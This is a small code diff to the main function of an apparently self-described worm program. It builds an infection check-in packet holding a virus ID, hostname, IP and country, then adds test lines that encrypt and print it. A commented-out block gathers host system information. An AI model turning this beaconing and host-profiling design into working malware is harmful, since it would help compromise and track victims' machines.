@@ -10,6 +10,7 @@ using namespace std;
 
 int main()
 {
+	
     cout << "Worm initalized ... \n\n";
 	char insert_key = 'A'; 
 	const char* virus_id = "firstviru"; 
@@ -17,15 +18,21 @@ int main()
 	const char* ip = "10.2.0.14"; 
 	const char* country = "US";
 
-
+	
 	char* packet = structure_init_message(insert_key, virus_id, hostname, ip, country);
-	cout << "the packet is" << packet << endl; 
+	cout << "the packet is " << packet << endl; 
 
-
+	
 	// Test the functions here
 
+	cout << "Encryption:" << encryption(packet) << endl;
+	char* result = encryption(packet);
+    fwrite(result, 32, 1, stdout);
 
 
+	//cout << "Decryption:" << decryption(result) << endl;
+	
+	   	  
 	//// Get information about the host computer
 	//SYSTEM_INFO siSysInfo;
 
